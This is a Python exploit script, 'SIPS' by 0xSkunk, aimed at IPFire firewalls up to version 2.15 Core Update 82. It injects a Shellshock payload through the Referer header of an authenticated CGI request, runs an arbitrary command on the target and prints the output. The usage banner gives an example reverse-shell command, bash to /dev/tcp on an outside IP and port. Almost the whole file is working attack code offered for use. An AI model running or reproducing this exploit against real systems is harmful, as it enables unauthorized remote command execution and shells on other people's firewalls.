import argparse
import sys
import requests
import time 
import socket
from requests.auth import HTTPBasicAuth
from urllib3.exceptions import InsecureRequestWarning
from art import *
from colorama import init
from colorama import Fore, Back, Style
from signal import signal, SIGINT


class Exploit():

	#Default Constructors
	def __init__(self):
		self.cmd = "whoami"
		self.target = ""
		self.username = "admin"
		self.password = "admin"
		self.directory = ""
		self.port = 444

	def title(self):
		title = "- SIPS -"
		header = text2art(title, font='speed')
		print(blue + header + "[*] " + yellow + "[S]" + blue + "kunk's" + yellow + " [IP]" + blue + "Fire " + yellow + "[S]" + blue + "hellshock - By 0xSkunk")
		print(blue + "[*] For use with Python3 - Effective against IPFire <= 2.15 Core Update 82 \n")
		print(yellow + "[*] Example Usage: python3 SIPS.py 69.69.13.37 444 /cgi-bin/index.cgi admin p@ssw0rd 'bash -i >& /dev/tcp/12.34.56.78/4444 0>&1'\n")
	
	def check_ssl(self):
		response = input(yellow + "[*] Is the target using (1) HTTP or (2) HTTPS: ")
		print(response)
		if response == "1":
			return "http://"
		elif response == "2":
			return "https://"
		else:
			print(red + "[*] Invalid response.")
			sys.exit()

	def the_good_stuff(self):
		with requests.Session() as s:
			url = exploit.ip + ":" + str(exploit.port) + exploit.directory
			print(green + "[*] Attempting to deliver payload: " + yellow + exploit.cmd)
			
			try:
				#Request made with HTTPBasicAuth as it's not a form. Headers edited to deliver payload.
				webpage = s.get(url, auth=HTTPBasicAuth(exploit.username, exploit.password), headers={'referer': '() { :;}; /bin/bash -c "' + exploit.cmd + '"' }, verify=False, timeout=5)
			except requests.exceptions.RequestException:
				print(red + "[!] The request has timed out - Check your arguments are correct and the webpage is online!")
				raise SystemExit()

			#If successful, try to grab the command that  was output since it's before the HTML
			if webpage.status_code == 200:
				print(green + "[*] It's your lucky day.. Getting server response..")
				time.sleep(1)
				output = webpage.content
				output = output.decode().split("<!DOCTYPE html>")[0]
				print("\n" + green + "[*] ~~Command Output~~")
				print(output)

			#Error handling
			elif webpage.status_code == 404:
				print(red + "[!] Check your directory, IP and port.. That page doesn't exist!")
				sys.exit()
			elif webpage.status_code == 403:
				print(red + "[!] Status code: 403 - Are you sure that's an accessible directory?")
				sys.exit()
			elif webpage.status_code == 401:
				print(red + "[!] It appears your credentials are invalid!")
				sys.exit()
			else:
				print(red + "[!] The webpage returned status code: " + str(webpage.status_code) + ". The exploit did not get executed. Please check your arguments and whether you should be using HTTPS!")
				sys.exit()

	def goodbye(self):
		print(green + "[*] Bye for now. Hope you got what you needed!")
		sys.exit()

def handler(signal_received, frame):
	# Catch user exit
	print('\n' + red + '[!] CTRL-C detected. Exiting gracefully... <3')
	exit(0)

if __name__ == '__main__':
	
	signal(SIGINT, handler)
	while True:

		#Supress SSL Warning
		requests.packages.urllib3.disable_warnings()
	
		#Set some pretty colours
		red = Fore.RED + Style.BRIGHT
		green = Fore.GREEN + Style.BRIGHT
		blue = Fore.CYAN + Style.BRIGHT
		yellow = Fore.YELLOW + Style.BRIGHT
		init(autoreset=True)

		#Instantiate the Class
		exploit = Exploit()
		exploit.title()

		#Positional Arguments
		parser = argparse.ArgumentParser()
		parser.add_argument("target", help="Target IP Address")
		parser.add_argument("port", type=int, help="Targets Port (Default = 444)", default = 444)
		parser.add_argument("directory", help="Directory that leads to vulnerable .cgi file.")
		parser.add_argument("username", help="Valid Username (Default = admin)", default = "admin")
		parser.add_argument("password", help="Valid Password (Default = admin)", default = "admin")
		parser.add_argument("cmd", help="Command to run on the target's server", default = "whoami")
		args = parser.parse_args()
		ip = args.target
		port = args.port
		cmd = args.cmd
		username = args.username
		password = args.password
		directory = args.directory

		try:
			socket.inet_aton(ip)
			print(green + "[*] Valid IP Address...")
			time.sleep(0.2)
		except socket.error:
			print(red + "[!] IP Address invalid!")
		
		try:
			port = int(port)
			print(green + "[*] Port is an integer...")
			time.sleep(0.2)
		except ValueError:
			print(red + "[!] Port should be an integer!")

		if directory[0] != "/":
			directory = "/" + directory
			print(red + "[!] Woops! You didn't put a forward-slash infront of your directory, so I've done it for you...")
			time.sleep(3)
		else:
			print(green + "[*] Directory correctly prefixed with /... ")
			time.sleep(0.2)
		
		ssl = exploit.check_ssl()
		exploit.cmd = cmd
		exploit.ip = ssl + ip 
		exploit.username = username
		exploit.password = password
		exploit.directory = directory
		exploit.port = port
		exploit.the_good_stuff()
		exploit.goodbye()